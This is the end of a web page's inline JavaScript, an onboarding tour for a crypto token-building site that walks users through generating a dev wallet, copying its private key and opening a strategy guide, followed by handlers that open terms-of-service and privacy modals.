                    // --- STEP 1: INITIALIZE IDENTITY ---
                    const walletBtn = document.getElementById("user-menu-toggle");
                    
                    positionTooltip(
                        walletBtn, 
                        "You cannot proceed without a secure deployment environment. Click here to generate a fresh Dev Wallet immediately.", 
                        "Step 1: Initialize Identity",
                        "left"
                    );
            
                    const handleStep1 = () => {
                        walletBtn.classList.remove("tour-highlight");
                        tooltip.classList.remove("visible");
                        walletBtn.removeEventListener("click", handleStep1);
                        
                        // Wait for wallet menu to open/generate
                        setTimeout(() => {
                            startStepKeySave();
                        }, 600);
                    };
            
                    walletBtn.addEventListener("click", handleStep1);
            
                    // --- STEP 2: SECURE CREDENTIALS (NEW) ---
                    // --- STEP 2: SECURE CREDENTIALS (FIXED POSITIONING) ---
                    function startStepKeySave() {
                        const dropdown = document.getElementById("wallet-dropdown");
                        const menuToggle = document.getElementById("user-menu-toggle");
                        const pkContainer = document.getElementById("private-key-container");
                        const pkDisplay = document.getElementById("private-key-display");
                        const pkToggle = document.getElementById("private-key-toggle");
            
                        // 1. Force UI State
                        menuToggle.classList.add("open");
                        dropdown.classList.add("open");
                        dropdown.style.zIndex = "10001"; // Elevate menu
            
                        // 2. Expand Key
                        pkDisplay.style.display = "block";
                        const toggleIcon = pkToggle.querySelector(".icon:last-child");
                        if(toggleIcon) toggleIcon.style.transform = "rotate(180deg)";
            
                        setTimeout(() => {
                            const tourContent = document.getElementById("tour-content");
                            const tooltip = document.getElementById("tour-tooltip");
                            const arrow = document.getElementById("tour-arrow");
            
                            tourContent.innerHTML = `
                                <h3><svg class="icon" style="stroke:#ff6b6b;"><use xlink:href="#icon-key"></use></svg> Step 2: Secure Credentials</h3>
                                <p><strong>CRITICAL:</strong> Save this Private Key immediately. This is the <u>only</u> way to access your funds. Click the key to copy it.</p>
                            `;
                            
                            pkContainer.classList.add("tour-highlight");
                            
                            // --- POSITIONING FIX ---
                            const rect = pkContainer.getBoundingClientRect();
                            
                            // Place to the LEFT of the dropdown so it doesn't overlap
                            const top = rect.top - 10; 
                            const left = rect.left - 340; 
                            
                            tooltip.style.top = `${top}px`;
                            tooltip.style.left = `${left}px`;
                            tooltip.classList.add("visible");
                            
                            // Arrow points to the RIGHT (towards the key)
                            arrow.style.right = "-7px";
                            arrow.style.left = "auto";
                            arrow.style.top = "30px";
                            arrow.style.transform = "rotate(45deg)";
                            // -----------------------
            
                            // Handler
                            const handleKeySave = () => {
                                pkContainer.classList.remove("tour-highlight");
                                tooltip.classList.remove("visible");
                                
                                pkContainer.removeEventListener("click", handleKeySave);
                                const pkText = document.getElementById("private-key-text");
                                if(pkText) pkText.removeEventListener("click", handleKeySave);
                                
                                setTimeout(() => {
                                    dropdown.classList.remove("open");
                                    menuToggle.classList.remove("open");
                                    dropdown.style.zIndex = ""; 
                                    startStepProtocol(); 
                                }, 600);
                            };
            
                            pkContainer.addEventListener("click", handleKeySave);
                            const pkText = document.getElementById("private-key-text");
                            if(pkText) pkText.addEventListener("click", handleKeySave);
                            
                        }, 300);
                    }
                    
                    // --- STEP 3: PROTOCOL BRIEFING (MOBILE COMPATIBLE) ---
                    // --- STEP 3: PROTOCOL BRIEFING (WITH RESTORE FIX) ---
                    function startStepProtocol() {
                        const howItWorksLink = document.querySelector('a[href="#how-it-works"]');
                        const mobileToggle = document.getElementById("mobile-menu-toggle");
                        const mainNav = document.getElementById("main-nav");
                        
                        if(!howItWorksLink) return endTour();
            
                        // --- CRITICAL FIX: Save the original navigation logic ---
                        // We store the normal "page switch" function so we can put it back later
                        const originalOnClick = howItWorksLink.onclick;
            
                        // --- MOBILE HANDLING ---
                        let isMobile = false;
                        if(window.getComputedStyle(mobileToggle).display !== 'none') {
                            isMobile = true;
                            mobileToggle.classList.add("open");
                            mainNav.classList.add("mobile-open");
                            mainNav.style.zIndex = "10001";
                            document.querySelector(".main-header").style.zIndex = "10001";
                        }
            
                        setTimeout(() => {
                            howItWorksLink.scrollIntoView({behavior: "smooth", block: "center"});
                            
                            setTimeout(() => {
                                const rect = howItWorksLink.getBoundingClientRect();
                                const tourContent = document.getElementById("tour-content");
                                const tooltip = document.getElementById("tour-tooltip");
                                const arrow = document.getElementById("tour-arrow");
                                
                                tourContent.innerHTML = `
                                    <h3><svg class="icon"><use xlink:href="#icon-check-circle"></use></svg> Step 3: Protocol Briefing</h3>
                                    <p>Before deploying capital, you must understand the execution parameters. <strong>Click here to read the strategy guide</strong>.</p>
                                `;
                                
                                howItWorksLink.classList.add("tour-highlight");
                                
                                // Positioning
                                let top, left;
                                if(isMobile) {
                                    top = rect.bottom + 15;
                                    left = window.innerWidth / 2 - 160; 
                                    const linkCenter = rect.left + (rect.width/2);
                                    const arrowOffset = linkCenter - left - 7;
                                    arrow.style.left = `${arrowOffset}px`;
                                    arrow.style.right = "auto";
                                } else {
                                    top = rect.bottom + 18;
                                    left = rect.left;
                                    arrow.style.right = "auto";
                                    arrow.style.left = "30px";
                                }
            
                                tooltip.style.top = `${top}px`;
                                tooltip.style.left = `${left}px`;
                                tooltip.classList.add("visible");
                                
                                // OVERRIDE CLICK
                                howItWorksLink.onclick = (e) => {
                                    e.preventDefault(); 
                                    e.stopPropagation();
            
                                    // 1. Perform the switch manually this one time
                                    document.querySelectorAll(".page-section").forEach(s => s.classList.remove("active"));
                                    const targetSection = document.getElementById("how-it-works-section");
                                    if(targetSection) targetSection.classList.add("active");
            
                                    document.querySelectorAll(".nav-link").forEach(n => n.classList.remove("active-nav"));
                                    howItWorksLink.classList.add("active-nav");
            
                                    window.scrollTo(0,0);
                                    
                                    // 2. Cleanup Mobile
                                    if(isMobile) {
                                        mobileToggle.classList.remove("open");
                                        mainNav.classList.remove("mobile-open");
                                        mainNav.style.zIndex = "";
                                        document.querySelector(".main-header").style.zIndex = "";
                                    }
                                    
                                    // 3. End Tour
                                    endTour(howItWorksLink);
            
                                    // --- CRITICAL FIX: RESTORE ORIGINAL LOGIC ---
                                    // We put the normal navigation handler back so future clicks work normally
                                    howItWorksLink.onclick = originalOnClick;
                                };
            
                            }, 400); 
                        }, isMobile ? 350 : 0); 
                    }
                    function endTour(lastElement) {
                        if(lastElement) lastElement.classList.remove("tour-highlight");
                        
                        overlay.classList.remove("active");
                        tooltip.classList.remove("visible");
                        document.body.classList.remove("tour-active");
                        
                        // Set Flag
                        localStorage.setItem("pumpForge_tour_complete", "true");
                        
                        setTimeout(() => {
                            window.showToast("System Unlocked. You are ready to build.", "success");
                        }, 500);
                    }
                }
            
                // Trigger tour (Short delay to ensure rendering)
                setTimeout(initTour, 1000);
                // --- LEGAL MODALS LOGIC ---
        // Find links in the footer column named "Legal"
        const footerLinks = document.querySelectorAll('.footer-column a');
        
        footerLinks.forEach(link => {
            const text = link.textContent.trim().toLowerCase();
            
            if (text.includes("terms of service")) {
                link.onclick = (e) => {
                    e.preventDefault();
                    document.getElementById('tos-modal').classList.add('open');
                };
            }
            
            if (text.includes("privacy policy")) {
                link.onclick = (e) => {
                    e.preventDefault();
                    document.getElementById('privacy-modal').classList.add('open');
                };
            }
        });
            });
        </script>

    </body>
</html>
